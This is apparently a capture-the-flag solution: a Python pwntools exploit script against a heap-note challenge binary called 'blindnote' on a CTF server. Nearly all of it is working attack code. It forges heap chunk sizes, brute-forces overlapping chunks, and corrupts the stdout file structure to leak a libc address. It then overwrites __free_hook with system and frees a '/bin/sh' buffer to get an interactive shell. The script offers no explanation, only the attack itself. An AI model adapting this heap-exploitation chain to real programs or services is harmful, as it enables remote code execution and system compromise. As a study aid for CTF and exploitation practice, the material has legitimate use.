from pwn import *
# context.log_level = 'debug'

TARGET = './blindnote'
HOST = 'blindnote.ctf.jyoken.net'
PORT = 80

elf = ELF(TARGET)
def start():
    if not args.R:
        print "local"
        return process(TARGET)
        # return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
        # return process(TARGET, stdout=process.PTY, stdin=process.PTY)
    else:
        print "remote"
        return remote(HOST, PORT)

def get_base_address(proc):
    return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    script += "set $_base = 0x{:x}\n".format(PIE)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print "\t-> %s: 0x%x" % (val, eval(val))

def create(text):
    r.sendlineafter('> ', '1')
    r.sendlineafter('s: ', text)

def delete(idx): 
    r.sendlineafter('> ', '3')
    r.sendlineafter('x: ', str(idx))
    ret = r.recvuntil('1. Create')
    assert 'Invalid' not in ret
 

r = start()
def exploit(r):

    for i in range(8):
        create(p64(0x21)*18)
    for i in range(6):
        delete(7-i)

    delete(0)
    create('A'*0x98+p64(0x421))
    delete(1)

    create('A'*0x98+p64(0xa1)+'\x00\xc3') #1/16
    # pause()
    create('A')  
    delete(0)
    create('A'*0x98+p64(0xa1)+'\x60\x37') #1/16
    # pause()
    create('A')  
    payload = ''
    payload += p64(0xfbad1800)
    payload += p64(0)
    payload += p64(0)
    payload += p64(0)
    payload += '\x00'
    create(payload)
    r.recv(8)
    leak = u64(r.recv(8))
    assert leak != 0x61657243202e310a

    base = leak - 0x3ed8b0
    print "leak: ", hex(leak) 
    print "BASE: ", hex(base) 
    return base

while(1):
    r = start()
    try:
        base = exploit(r)
        break

    except:
        r.close()
    r.close()

if args.D:
    debug(r, [])

fh = base + 0x3ed8e8
system = base + 0x4f440

delete(3)
delete(0)
create('/bin/sh\x00'+'A'*0x90+p64(0xa1)+p64(fh))
create('c0bebeef')
create(p64(system))

r.sendlineafter('> ', '3')
r.sendlineafter('x: ', str(0))

r.interactive()
r.close()
